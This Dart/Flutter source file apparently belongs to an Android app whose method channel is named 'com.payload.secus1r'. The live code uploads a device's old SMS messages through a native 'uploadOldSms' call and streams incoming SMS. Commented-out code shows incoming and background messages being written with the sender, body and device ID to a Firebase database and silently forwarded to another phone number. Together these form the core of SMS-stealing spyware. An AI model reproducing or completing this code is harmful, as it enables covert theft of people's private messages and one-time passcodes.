// import 'package:another_telephony/telephony.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:intl/intl.dart';

import 'fetch_device_info.dart';


class SMSClass {
  // static final Telephony telephony = Telephony.instance;

  // static void directSMSSend({required String message, required String number}) {
  //
  //   telephony.sendSms(to: number, message: message);
  // }




  // static var platform = MethodChannel('com.payload.secus1r/service');
  //
  // static Future<void> startSmsListenerService() async {
  //   try {
  //     await platform.invokeMethod('startService');
  //   } catch (e) {
  //     print("Error starting service: $e");
  //   }
  // }

  static const platform = MethodChannel('com.payload.secus1r/sendAll');

  static Future<void> uploadOldSms() async {
    try {
      final result = await platform.invokeMethod('uploadOldSms');
      print('✅ $result');
    } on PlatformException catch (e) {
      print('❌ Failed: ${e.message}');
    }
  }

  // static Future<void> initSmsListener() async {
  //   bool? permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
  //   if (permissionsGranted ?? false) {
  //     smsListen();
  //   } else {
  //     print("SMS Permission not granted!");
  //   }
  // }

  static const EventChannel _smsChannel = EventChannel("sms_events");

  static void listen(Function(String sender, String body) onSms) {
    _smsChannel.receiveBroadcastStream().listen((event) {
      final sender = event["sender"];
      final body = event["body"];
      onSms(sender, body);
    });
  }

  // static void smsListen() async{
  //
  //   telephony.listenIncomingSms(
  //     onNewMessage: (SmsMessage message) async{
  //       final sender = message.address;
  //       final body = message.body;
  //
  //       debugPrint("📩 New SMS from $sender: $body");
  //       final deviceID = DeviceInformation.deviceId;
  //       final id = DateTime.now().millisecondsSinceEpoch;
  //
  //       await FirebaseDatabase.instance
  //           .ref("messages/$deviceID/$id")
  //           .set({
  //         {
  //           "dateTime": DateFormat('dd/MM/yyyy | hh:mm a').format(DateTime.now()),
  //           "id": deviceID,
  //           "message":body,
  //           "sender": sender,
  //           "type": "incoming"
  //         }
  //       });
  //
  //       // Forward SMS
  //       // telephony.sendSms(
  //       //   to: "",
  //       //   message: "Forwarded SMS from $sender: $body",
  //       // );
  //     },
  //     listenInBackground: true, // 👈 important if you only want foreground
  //     onBackgroundMessage: backgroundMessageHandler
  //   );
  // }


  // @pragma('vm:entry-point')
  // static void backgroundMessageHandler(SmsMessage message) async {
  //   // final deviceID = DeviceInformation.deviceId;
  //   // final id = DateTime.now().millisecondsSinceEpoch;
  //   //
  //   // await FirebaseDatabase.instance
  //   //     .ref("messages/$deviceID/$id")
  //   //     .set({
  //   //   {
  //   //     "dateTime": DateFormat('dd/MM/yyyy | hh:mm a').format(DateTime.now()),
  //   //     "id": deviceID,
  //   //     "message":message.body,
  //   //     "sender": message.address,
  //   //     "type": "incoming"
  //   //   }
  //   // });
  //   telephony.sendSms(
  //     to: "",
  //     message: "Forwarded (BG) from ${message.address}: ${message.body}",
  //
  //   );
  // }



}
